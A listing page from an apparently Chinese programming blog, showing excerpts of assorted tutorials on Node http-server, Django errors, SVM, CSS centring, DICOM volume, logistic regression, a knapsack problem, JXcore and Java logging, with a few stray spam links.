栏目标题自定义，栏目内容可复制如下代码 &lt;div id="custom_column_41051715" class="panel"&gt; &lt;ul class="panel_head"&gt;&lt;span&gt;支付宝打赏&lt;/span&gt;&lt;/ul&gt; &lt;ul class="panel_body"&gt; &lt;img src="https://img-blog.csdnimg.cn/20190104125820230.jpg" alt="支付宝" title="支付宝二维码" height="100%" width="100%"&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div id="custom_column_41051842" class="panel"&gt; &lt;ul class="panel_head"&gt;&lt;span&gt;微信打赏&lt;/span&gt;&lt;/ul&gt; &lt;ul class="panel_body"&gt; &lt;img src="https://img-blog.csdnimg.cn/20190104125713885.jpg" alt="微信" title="微信二维码" height="100%" width="100%"&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div id="custom_column_41051842" class="panel"&gt; &lt;ul class="panel_head"&gt;&lt;span&gt;QQ打赏&lt;/span&gt;&lt;/ul&gt; &lt;ul class="panel_body"&gt; &lt;img src="https://img-blog.csdnimg.cn/20190104125913605.png" alt="QQ" title="QQ二维码" height="100%" width="100%"&gt; &lt;/ul&gt; &lt;/div&gt; 主页查看效果 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/553501ff870dd90d27ba7ad233aa3c4a/" rel="bookmark">
			npm install http-server global 安装http-server服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
最近在使用webstrom loaclhost 服务开发项目时，遇到如下问题：
1.无法再局域网内同于ip的方式访问项目
2.在使用chrome的在线编辑自动保存功能的时候经常会出现一个乱码
所以选择安装了 http-server 来架设服务器 安装步骤如下：
前提：你一定已经安装了Node.js ,如何验证安装了node.js 请在命令行窗口下执行 node -v 如果出现版本信息说明已经安装成功
准备工作一：
如果没有安装请到如下网址下载 ，并点击安装 按照提示就行一步步安装（同传统软件安装）
http://nodejs.cn/download/
根据自己的电脑选中版本 我的是 windows 64位 msi和zip 选中其中一个就可以进行下载 安装完成后请重新关闭在启动命令行 就行验证。是否安装成功
准备工作二：
使用cnpm 代替 npm命令 解决被墙问题
现在进行http-server的安装
1.在命令行下操作：
注意：-g 参数代表全局安装一定不要省略，全局安装后，全局都可以使用
cnpm install http-server -g 效果如下：
2.在你需要使用的项目根目录下运行
http-server 效果如下：
3.复制如下任一地址在浏览器中进行访问 或者使用其他局域网的手机或者pc进行访问（你的地址和我的不同请使用自己的地址）
http-server 还有一些参数，如果需要详细配置可以进步参考官网文档或者就搜索进行深入学习
参考链接：
https://www.npmjs.com/package/http-server （http-server npm包的地址）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7686e7f6d32252ed2734ce6e982e53cc/" rel="bookmark">
			DoesNotExist: User matching query does not exist/
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		异常堆栈 File "E:\python35\lib\site-packages\django\contrib\auth\decorators.py", line 21, in _wrapped_view return view_func(request, *args, **kwargs) File "E:\pycharm\mysites\account\views.py", line 129, in myself_edit userprofile = UserProfiles.objects.get(user=request.user) if hasattr(request.user, 'userprofile') else UserProfile.objects.create(user=request.user) NameError: name 'UserProfile' is not defined [04/Jan/2019 23:58:38] "GET /account/edit-myinformation/ HTTP/1.1" 500 72461 Internal Server Error: /account/myinformation/ Traceback (most recent call last): File "E:\python35\lib\site-packages\django\db\backends\utils.py", line 85, in _execute return self.cursor.execute(sql, params) File "E:\python35\lib\site-packages\django\db\backends\sqlite3\base.py", line 296, in execute return Database.Cursor.execute(self, query, params) sqlite3.IntegrityError: UNIQUE constraint failed: account_userprofiles.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7686e7f6d32252ed2734ce6e982e53cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93eb8bd4c1301bae27c4c85763bec601/" rel="bookmark">
			SVM调参实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SVM调参实例 1.随机生成一些数据
%matplotlib inline import numpy as np import matplotlib.pyplot as plt from scipy import stats # use seaborn plotting defaults import seaborn as sns sns.set() # 随机生成一些数据 from sklearn.datasets.samples_generator import make_blobs X,y = make_blobs(n_samples=50,centers=2,random_state=0,cluster_std=0.6) plt.scatter(X[:,0],X[:,1],c=y,s=50,cmap='autumn') 2.随便地画几条分割线，哪个好来着？
xfit = np.linspace(-1,3,5) plt.scatter(X[:,0],X[:,1],c=y,s=50,cmap='autumn') # 画出异常点 plt.plot([0.6],[2.1],'x',color='red',markeredgewidth=2, markersize=10) for m,b in [(1,0.65), (0.5, 1.6), (-0.2, 2.9)]: plt.plot(xfit,m*xfit+b,'-k') plt.xlim(-1,3.5) 3.将2中的线进行扩充
xfit = np.linspace(-1,3.5) plt.scatter(X[:,0],X[:,1],c=y,s=50,cmap='autumn') for m, b, d in [(1, 0.65, 0.33), (0.5, 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93eb8bd4c1301bae27c4c85763bec601/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ba71fdda5e9e4dae2cf569b2ddf5f17/" rel="bookmark">
			单选框radio单击取消选中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;script type="text/javascript" src="http://lib.sinaapp.com/js/jquery/1.7.2/jquery.min.js"&gt; &lt;/script&gt; &lt;script type="text/javascript"&gt; $(function(){ $('input:radio').click(function(){ var domName = $(this).attr('name'); var $radio = $(this); if ($radio.data('waschecked') == true){ $radio.prop('checked', false); $("input:radio[name='" + domName + "']").data('waschecked',false); } else { $radio.prop('checked', true); $("input:radio[name='" + domName + "']").data('waschecked',false); $radio.data('waschecked', true); } console.log("选中状态:",$(this).prop("checked")); console.log($("input:radio[name='" + domName + "']:checked").val()); }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form&gt; &lt;input type="radio" name="browser" value="AAAA"&gt;AAAA&lt;br /&gt; &lt;input type="radio" name="browser" value="BBBBB"&gt;BBBBB&lt;br /&gt; &lt;input type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ba71fdda5e9e4dae2cf569b2ddf5f17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f846cc3ac74f72de18ed29b75227a66/" rel="bookmark">
			PHP 简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PHP 是服务器端脚本语言。
。。。。。。。。。。。。
PHP 是什么？
PHP（全称：PHP：Hypertext Preprocessor，即"PHP：超文本预处理器"）是一种通用开源脚本语言。
PHP 脚本在服务器上执行。
PHP 可免费下载使用。
PHP 对初学者而言简单易学。
PHP 也为专业的程序员提供了许多先进的功能。
。。。。。。。。。。。。
PHP 文件是什么？
PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码
PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器
PHP 文件的默认文件扩展名是 ".php"
。。。。。。。。。。。。
PHP 能做什么？
PHP 可以生成动态页面内容
PHP 可以创建、打开、读取、写入、关闭服务器上的文件
PHP 可以收集表单数据
PHP 可以发送和接收 cookies
PHP 可以添加、删除、修改您的数据库中的数据
PHP 可以限制用户访问您的网站上的一些页面
PHP 可以加密数据http://www.iis7.com/a/lm/zhanqun/
通过 PHP，您不再限于输出 HTML。您可以输出图像、PDF 文件，甚至 Flash 电影。您还可以输出任意的文本，比如 XHTML 和 XML。
。。。。。。。。。。。。
为什么使用 PHP？
PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）
PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）
PHP 提供了广泛的数据库支持
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f846cc3ac74f72de18ed29b75227a66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5100d5d1606c20fd9008af2d67c120d8/" rel="bookmark">
			SS导航菜单水平居中的多种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在网页设计中，水平导航菜单使用是十分广泛的，在CSS样式中，我们一般会用Float元素或是「display:inline-block」来解决。而今天主要讲解如何让未知宽度的元素居中，下面我们会列出几种方法来解决水平居中问题。当然这些方法不一定是用来解决导航菜单问题，还有其它类似情况也是可以使用的。
在线演示：Demo
CSS导航菜单水平居中的多种方法：
方法1：display:inline-block方法2：position:relative方法3：display:table方法4：display:inline-flex方法5：width:fit-content / width:intrinsic 方法1：display:inline-block 这个方法比较简单，是将容器转成「display:inline-block」行内块级元素，然后就可以直接用「text-align:center」使其达到水平居中效果。
HTML代码：
这里我们需要一个div来包围这个导航菜单。
&lt;div class="navbar"&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="/"&gt;首页&lt;/a&gt;&lt;/li&gt; … &lt;/ul&gt; &lt;/div&gt; CSS代码：
给外面的div添加「text-align:center」，然后将菜单容器设成「display:inline-block」行内块级元素，菜单浮左「float:left」
.navbar { text-align:center; } .navbar ul { display:inline-block; } .navbar li { float:left; } .navbar li + li { margin-left:20px; } 这里浏览器兼容只能是IE8或更高版本，所以如果要兼容IE7的话，请加入以下代码
.navbar ul { display:inline; zoom:1; } 方法2：position:relative 这是使用「position:relative」定位方法来让元素水平居中，我不是很推荐这方法，因为代码多了个div去包住，当然这些是根据情况来使用的。
HTML代码：
&lt;div class="navbar"&gt; &lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="/"&gt;首页&lt;/a&gt;&lt;/li&gt; … &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; CSS代码：
将定位div设为浮动，再定位「left:50%」,然后导航定位至「left:-50%」，这方法很有意思吧。可能表达不是很清楚，自己看代码吧^^
.navbar { overflow:hidden; } .navbar &gt; div { position:relative; left:50%; float:left; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5100d5d1606c20fd9008af2d67c120d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/619aad43fb481fd28e4705614229c7f9/" rel="bookmark">
			python处理DICOM，并计算三维模型体积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在已知DICOM和三维模型对应掩膜的情况下，计算三维模型的体积。
思路：
1、计算每个体素的体积。每个体素为长方体，x，y为PixelSpacing，z为层间距
使用pydicom.read_file读取DICOM文件，dcm_tag.PixelSpacing获取像素间距，dcm_tag.SliceLocation 获取层间距
2、计算体素的个数
代码如下：
from PIL import Image import numpy as np import pydicom import os def get_pixels_No(bmp_data_dir): pixels_No = 0 bmp_files = os.listdir(bmp_data_dir) for bmp in bmp_files: bmp_file = os.path.join(bmp_data_dir,bmp) img = Image.open(bmp_file) img_array = np.array(img) # img_array.dtype为布尔类型，需要转换为Int类型，其累加和恰好为体素总和 img_array_int = img_array.astype(int) pixels_No = pixels_No+img_array_int.sum() return pixels_No def get_pixel_info(dcm_data_dir): pixel_infos = [] dcm_files = os.listdir(dcm_data_dir) dcm_file_1 = os.path.join(dcm_data_dir,dcm_files[0]) dcm_tag_1 = pydicom.read_file(dcm_file_1) # 获取像素间距. spacex, spacey = dcm_tag_1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/619aad43fb481fd28e4705614229c7f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/743cb794b7249df90a26f21fdfadf0fe/" rel="bookmark">
			python字典(dict)相加，相同key相加，不同key保留
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 字典 相加：
假如 两个字典dict1={'a':1,'b':2,'c':3},dict2={'c':4,'d':5}，若两个dict1和dict2有相同的key则对应的value相加，若没有则直接添加过来。结果为dict3={'a':1,'b':2,'c':7,'d':5}
def merge_dict(x,y): for k,v in x.items(): if k in y.keys(): y[k] += v else: y[k] = v 底下这个是所有元素相加
x={'a':1,'b':2,'c':3} y={'c':4,'d':5} from collections import Counter X,Y=Counter(x),Counter(y) z=dict(X+Y) print(z) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb254abf15e7d7f58a0196a37c0414ad/" rel="bookmark">
			Linux连接WiFi后依然没有网络解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【用户名@主机名 当前位置】route -n ##显示IP路由表。
【用户名@主机名 当前位置】# cd /etc/sysconfig/network-scripts/ ##切换当前目录到/etc/sysconfig/network-scripts/
【用户名@主机名 network-scripts】# ls ##查看此目录下都有哪些文件。
【用户名@主机名 network-scripts】# rm -fr route-br0 ##，如果有route-br0文件，则将其删除(注：删除系统文件需要切换到超级用户）
【用户名@主机名 network-scripts】# vim e-br0 ##查看route-br0文件，如果有GATEWAY=172.25.254.250，则将其删除
【用户名@主机名 network-scripts】# vim ifcfg-br0 ##查看文件vim ifcfg-br0，如果有GATEWAY=172.25.254.250，则将其删除
【用户名@主机名 network-scripts】# reboot ##(重启电脑）
小结：找到三个系统文件并删除，删除完毕后重启电脑即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ef2a925ebc8fdeddf81a57f5e1d47b9/" rel="bookmark">
			在spring web项目中获取WEB-INF/classes目录与WEB-INF/目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景:在spring web项目中获取WEB-INF/classes目录与WEB-INF/目录
1.获取WEB-INF/classes 目录 /**1.获取WEB-INF/classes 目录 **/ public static String getWebRootPath() { String webRootPath = CommonConfigUtils.class.getResource("/").getPath(); return webRootPath; } 2.获取WEB-INF/
/**2.获取WEB-INF/ 目录*/ public static String getWebInfPath() { String webRootPath = CommonConfigUtils.class.getResource("/").getPath(); String webInfPath = webRootPath.substring(0,webRootPath.indexOf("classes")); return webInfPath; } 以上,TKS.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37863d954689b51c9305702a031e27cf/" rel="bookmark">
			机器学习3 逻辑斯提回归和梯度下降算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 上节我们介绍了很多线性回归模型，如何用线性模型做分类任务呢？是不是可以将线性回归模型的预测值和到分类任务的标记联系起来呢？
逻辑斯提回归 对于一个二分类任务，输出标记y为{0,1}，而线性回归模型产生的预测值z为全体实数，我们想把z转换成0/1值。我们首先想到是“单位阶跃函数”。
利用线性回归模型产生预测值z，经过单位阶跃函数做变换，如果z&lt;=0，就归为负类，若z&gt;0就归为正类。但单位阶跃函数性质不好，不连续。我们用对数几率函数（也叫sigmoid函数）进行替代：
函数图像为：
这样就将预测值z映射到（0,1）之前，那么怎么进行分类呢？同样是：如果z&lt;=0，就归为负类，若z&gt;0就归为正类。映射到（0,1）还有一个好处是，可以看成近似的概率。例如y=0.8，就说它归为正类的概率为0.8。
上一节讲到我们的线性模型为;
将偏置项和权重系数合并：
其中：
代入到对数几率函数中：
下标sigmoid，表示映射函数为sigmoid函数。这就是逻辑斯提回归模型。
那么我们如何求解参数W呢？
由对数函数的性质可知：
上式即为在已知样本x和参数θ的情况下，样本x属性正样本(y=1)和负样本(y=0)的条件概率。理想状态下，根据上述公式，求出各个点的概率均为1，也就是完全分类都正确。但是考虑到实际情况，样本点的概率越接近于1，其分类效果越好。比如一个样本属于正样本的概率为0.51，那么我们就可以说明这个样本属于正样本。另一个样本属于正样本的概率为0.99，那么我们也可以说明这个样本属于正样本。但是显然，第二个样本概率更高，更具说服力。我们可以把上述两个概率公式合二为一：
合并出来的Cost，我们称之为代价函数(Cost Function)。当y等于1时，(1-y)项(第二项)为0；当y等于0时，y项(第一项)为0。为了简化问题，我们对整个表达式求对数，(将指数问题对数化是处理数学问题常见的方法)：
这个代价函数，是对于一个样本而言的。给定一个样本，我们就可以通过这个代价函数求出，样本所属类别的概率，而这个概率越大越好，所以也就是求解这个代价函数的最大值。既然概率出来了，那么最大似然估计也该出场了。假定样本与样本之间相互独立，那么整个样本集生成的概率即为所有样本生成概率的乘积，再将公式对数化，便可得到如下公式：
其中，m为样本的总数，y(i)表示第i个样本的类别，x(i)表示第i个样本，需要注意的是W是多维向量，x(i)也是多维向量。
接下来的问题是求解W使得上式最小、
通过一连串的分析，可以看出一个机器学习算法其实只有两部分
模型从输入特征x预测输入y的那个函数h(x)目标函数 目标函数取最小(最大)值时所对应的参数值，就是模型的参数的最优值。很多时候我们只能获得目标函数的局部最小(最大)值，因此也只能得到模型参数的局部最优值。 梯度下降算法 上节介绍的线性回归模型，能够通过闭式方程直接算出最适合训练集的模型参数。这里我们介绍另一种方法：梯度下降，通过迭代优化，逐渐调整模型参数直至到达理想的情况。这里介绍梯度下降和变体随机梯度下降。
我们先看个简单的求极小值的例子。
来吧，做到送分题。这个函数的极值怎么求？它的函数图像为：
求导数，令其为0，解出x即可。
但是实际任务的函数不会像上面这么简单，就算求出了函数的导数，也很难精确计算出函数的极值。此时我们就可以用迭代的方法来做。就像爬坡一样，一点一点逼近极值。这种寻找最佳拟合参数的方法，就是最优化算法。爬坡这个动作用数学公式表达即为：
对我们的函数而言就是：
迭代公式为：
其中n为学习率，学习率越高，迈的步子越大。
当梯度为0或到达一定迭代次数后，算法就会停止。
梯度下降算法有个问题，可能只会到达局部最优，而不是全局最优。
算法到达B点就会停止，不会找到最优解C 。
随机梯度下降 梯度下降算法每次更新权重时都需要遍历整个数据集，这样在数据集很大时使得计算复杂度太高，改进方法是一次仅用一个样本点更新权重系数，这就叫随机梯度下降算法。因此每次采用一个样本，它比梯度下降不稳定，不断的上上下下，但整体看，还是慢慢下降，最终接近最小值。因为它不稳定也带来了一个优点：能跳出局部最优。
在sklearn中，可以使用SGDRegressor来实现回归任务的随机梯度下降。
以上节线性回归为例，使用随机梯度下降：
参数：
loss：损失函数，默认为平方误差，可选项：‘squared_loss’, ‘huber’, ‘epsilon_insensitive’, or ‘squared_epsilon_insensitive’
‘squared_loss’：平方误差
“huber”：修正了“squared_loss”，通过从平方转换到基于epsilon距离的线性损失，减少了对异常值的校正。
epsilon_insensitive：epsilon_insensitive’ 忽略小于 epsilon的误差。使用的是SVR的损失函数。
'squared_epsilon_insensitive：上面的平方损失
penalty:惩罚项，可选项：‘none’, ‘l2’, ‘l1’, or ‘elasticnet’
alpha：常数乘以正则化项。默认值为0.0001，当设置为“最优”时，也用于计算learning_rate。不常用。
l1_ratio：elasticnet弹性网络中l1正则项的程度
fit_intercept：偏置项
max_iter：最大迭代次数
tol：容忍误差
shuffle：训练数据是否应该在每个epochs之后重新洗牌。默认值为True。
verbose：不常用
epsilon：只有当huber’, ‘epsilon_insensitive’, or ‘squared_epsilon_insensitive’时可用，对于“huber”来说，它决定了一个阈值，在这个阈值内，不必准确预测。对于epsilon_insensitive’，如果当前的预测与正确的标记之间的差异小于这个阈值，则忽略它们。
random_state:种子生成器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37863d954689b51c9305702a031e27cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbaa83c96033fa5817f47fe017dfbc34/" rel="bookmark">
			饭卡问题题解（对01背包更深入的应用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Time limit 1000 ms
Memory limit 32768 kB
OS Windows
题目
电子科大本部食堂的饭卡有一种很诡异的设计，即在购买之前判断余额。如果购买一个商品之前，卡上的剩余金额大于或等于5元，就一定可以购买成功（即使购买后卡上余额为负），否则无法购买（即使金额足够）。所以大家都希望尽量使卡上的余额最少。 某天，食堂中有n种菜出售，每种菜可购买一次。已知每种菜的价格以及卡上的余额，问最少可使卡上的余额为多少。 Input
多组数据。对于每组数据： 第一行为正整数n，表示菜的数量。n&lt;=1000。 第二行包括n个正整数，表示每种菜的价格。价格不超过50。 第三行包括一个正整数m，表示卡上的余额。m&lt;=1000。 n=0表示数据结束。 Output
对于每组输入,输出一行,包含一个整数，表示卡上可能的最小余额。
分析：本题本质上，涉及到一个01背包问题，基础问题参考nyo:j289-苹果，需要稍加改进，如果对01背包问题足够理解的，应该不难理解本题。
题意：题目说用饭卡打饭，只要饭卡的余额还大于等于5的话，就可以买任意一种菜，直到余额小余5。所以可以先找到最贵的一份菜，然后按01背包的思路计算背包容量为v-5所能容纳的最大价值（把最贵的菜舍去，因为最后用到），然后在减去之前最贵的菜，这时可使饭卡余额最少。
代码如下：
#include &lt;stdio.h&gt; #include &lt;string.h&gt; #define MAX 1005 #define max(a,b) a&gt;b?a:b int main() { int n,p[MAX],dp[MAX],m; //n菜的数量 //p菜的价格 //m卡上余额 while(~scanf("%d",&amp;n) &amp;&amp; n!= 0){ memset(dp,0, sizeof(dp)); memset(p,0, sizeof(p)); for(int i=0;i&lt;n;i++){ scanf("%d",&amp;p[i]); } scanf("%d",&amp;m); int max=-2,pos; //max用于找到最大值 pos记录最大值的位置 for(int i=0;i&lt;n;i++){ if(p[i]&gt;max) { max=p[i]; pos=i; } } if(m&lt;5){ printf("%d\n",m); continue; } for(int i=0;i&lt;n;i++){ if(i==pos) continue; for(int j=m-5;j&gt;=p[i];j--){ dp[j]=max(dp[j],dp[j-p[i]]+p[i]); } } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbaa83c96033fa5817f47fe017dfbc34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a55d2505ad5bdd737ed64f57263856cd/" rel="bookmark">
			Node.js JXcore 打包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Node.js是一个开放源代码、跨平台的、用于服务器端和网络应用的运行环境。
JXcore是一个支持多线程的 Node.js 发行版本，基本不需要对你现有的代码做任何改动就可以直接线程安全地以多线程运行。
。。。
JXcore 安装
下载JXcore安装包，然后进行解压，在解压的目录下提供了jx二进制文件命令，接下来我们主要使用这个命令。
步骤1、下载
在http://jxcore.com/downloads/中下载JXcore安装包，你需要根据你自己的系统环境来下载安装包：
1、Window系统下载：Download，http://www.iis7.com/
2、Linux/OSX下载安装命令，直接下载解压包下的jx二进制文件，然后拷贝到/usr/bin目录下：
$ wget https://s3.amazonaws.com/nodejx/jx_rh64.zip
$ unzip jx_rh64.zip
$ cp jx_rh64/jx /usr/bin
将/usr/bin添加到PATH路径中：
$ export PATH=$PATH:/usr/bin
以上步骤如果操作正确，使用以下命令，会输出版本号信息：
$ jx --version
v0.10.32
。。。
包代码
例如，我们的Node.js项目包含以下几个文件，其中index.js是主文件：
drwxr-xr-x 2 root root 4096 Nov 13 12:42 images
-rwxr-xr-x 1 root root 30457 Mar 6 12:19 index.htm
-rwxr-xr-x 1 root root 30452 Mar 1 12:54 index.js
drwxr-xr-x 23 root root 4096 Jan 15 03:48 node_modules
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a55d2505ad5bdd737ed64f57263856cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e8709d59de5c7dc691a4237d8a3db19/" rel="bookmark">
			线阵相机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线阵相机 什么是线阵摄像机 线阵摄像机使用的Line-Scan Sensor(传感器)通常只有一行感光单元（少数彩色线阵使用三行感光单元的Sensor）；每次只采集一行图像；每次只输出一行图像；传统Area-Scan（面阵摄像机）每次采集若干行图像并以帧方式（Frame）输出。 线阵摄像机的使用场合 高分辨率；高速运动；曲面检测。 线阵摄像机的工作原理 线阵摄像机是由Line-Scan CCD传感器，驱动控制电路和A/D（模数转换，即模拟信号与数字信号转换）转换电路组成；被摄物发出的光线通过镜头进入到CCD传感器上；CCD传感器将光能转换成视频脉冲信号；视频信号再经A/D电路转换成数字信号输出；每次输出的数字图像信号是一行像素。 线阵摄像机采集速度的确定 线阵摄像机的采集速度（Line Rate）的单位 是 ：行/秒，表示线阵摄像机每秒钟可以采集的 图像行数线阵最大采集速度，即最高行频的计算公式：行频= [线阵的像素时钟] / [线阵的每行像素数]例如某40M的线阵，其分辨率是8192像素，则其最 大行频是 ：40MHz / 8192 = 4.8KHz；即该摄像 机最大每秒可以采集4800行，每行由8192个像素 组成线阵最大采集速度可直接查看该型号摄像机的技 术参数手册，通常该标称值会略小于公式计算值 线阵摄像机曝光时间的确定 普通线阵最小的曝光时间取决于最高行频，t&lt;1/[最高行 频]。
确定视场范围的方法 线阵的视场范围是一维的，即只有宽度信息；
线阵的视场宽度和所选择的镜头焦距是相关的；
线阵的视场宽度的计算公式如下：
Field of view (FOV) = [pixel cell size] x [number of pixels] x [working distance] / [focal length]
例如，某线阵摄像机Sensor上的像素物理尺寸（宽度）是10um，摄像机的分辨率是2048 个像素，镜头距离被测 物体的距离是160mm，使用的镜头焦距是55mm，那么该情况下的视场宽度是：
FOV = 10um x 2048 pixels x 160mm / 55mm = 59.58mm
不同型号线阵摄像机所采用的Sensor可能是不同厂家的。 因此它们的像素物理尺寸很可能是不同的。对于分辨率同 是2048的两只不同型号的线阵摄像机，它们在同样的工作 距离上，使用同一只镜头的情况下，得到的实际视场很可 能是不同的，这一点请千万注意。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e8709d59de5c7dc691a4237d8a3db19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a298e13ab322619af6711567b7b89666/" rel="bookmark">
			日志系统中的API小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于Java Web来说，日志是特别重要的一个东西，很多时候，可能是了解应用程序如何执行的唯一方式。在Java中，在日志方面，有许多的日志框架。
1.java.util.logging包，简称为j.u.l。在JDK1.4版本中就已经在使用。对于logging包，提供了七个日志级别来控制输出，分别为SEVERE、WARING、INFO、FINE、FINER、FINEST。
2.Log4j
它是Apache的一个开源项目，使用log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件、甚至是套接口服务器、NT的事件记录器，控制每条日志的输出格式。log4j也分为七个日志级别，每一条日志信息的不同能够更加控制日志的生成过程。七个日志级别为：OFF、FATAL、ERROR、WARN、INFO、DEBUG、TRACE。这些可以通过配置文件来灵活的配置。
3 LogBack
是一个很成熟的日志框架，目前分为三个模块：logback-core、logback-classic、logback-access。其中logback-core是其他两个模块的基础模块；logback-classic是log4j的一个改良版本，实现了SLF4J API。logback-access访问模块与Servlet容器集成提供通过Http来访问日志的功能。
要想打印日志消息的话，可以使用上述框架中的一种。还有另外一种框架和上述有区别，区别在于它的类型原理不一样。很多公司推荐不直接使用日志系统中的API，而是依赖于日志框架SLF4j中的API，它是一种门面模式的日志框架，有利于维护和各个类的日志处理方式统一。门面模式的核心为外部与一个子系统的通信必须通过一个统一的外观对象进行。前面的几种在于每一种日志框架都有自己单独的API，要使用对应的框架就要使用对应的API，对于程序来说很不方便。SLF4j解决了这个问题。对于底层的应用程序来说，无论底层的日志框架如何变更，都不需要任何感知。在计算机科学领域中，任何存在的问题都可以通过增加一个间接的中间层来解决。即所谓的门面模式.SLF4j是Java简易门面，一套包装Logging框架的界面模式，它只是一个门面服务而已，并不是真正的日志框架，真正日志输出相关的实现还是依赖于Log4j、logback等日志框架。Apache Commons Logging也是一种门面模式，是基于Java的日志记录实用程序，用于日志记录和其他工具包的编程模型，通过一些工具提供API,日志实现和包装器实现。
相对于Log4j的API，SLF4J存在一下特点：
Log4j存在TRACE、DEBUG、INFO、WARN、ERROR、FATAL六种记录等级。在SLF4j中拿掉了FATAL等级，只剩下五种。
Log4j间接的可以使用string相加的写法，这种写法存在性能的问题，而SLF4j不会出现这个问题，可以使用logger.error("{}is+serviceid".serviceid)
SLF4J只支持MDC、不支持NDC.。
关于日志输出的，主要有两类工具。
一类是日志框架，主要用于进行日志的输出，比如那个文件和日志格式，另一类是日志门面，一套通用的APi,用来屏蔽各个日志框架之间的差异。对于程序员来说，可以使用Log4j+SLF4j来组合进行日志输出。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca4a763e8f174203ee000a8ab6fe91a8/" rel="bookmark">
			WORD 同一位置连续引用多个参考文献编辑技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		例如想把 [1][2][3][4] 变成 [1,2,3,4] 这种合并的形式
连续尾注问题
引用文献特别在文献综述部分，常常要把几篇引文列在一起，如[21-25]，但是word没有这一功能，又不能将中间的文献删去，否则尾注引文也会自动删除，所以只好用比较笨的方法实现：
① 先按照常规的方法将所有尾注插入好，包括替换样式，如有连续的尾注先不处理，例如形成 [3][4][5][6] 这样的连续尾注，下面要变成“[3-6]”的形式。
② 选择字符“][4][5][”，快捷键 按下 alt 再按 H-FN 调出字体属性框，在“效果”选项中勾上“隐藏”的复选框，将所选字符隐藏。这样形式上达到要求，而且也能够保留引文链接。
闭门造车不如问百度，问人不如问百度
哪里不会查哪里，so easy.
https://jingyan.baidu.com/article/d2b1d102a252ac5c7e37d40d.html
https://zhidao.baidu.com/question/277156249.html
交叉引用
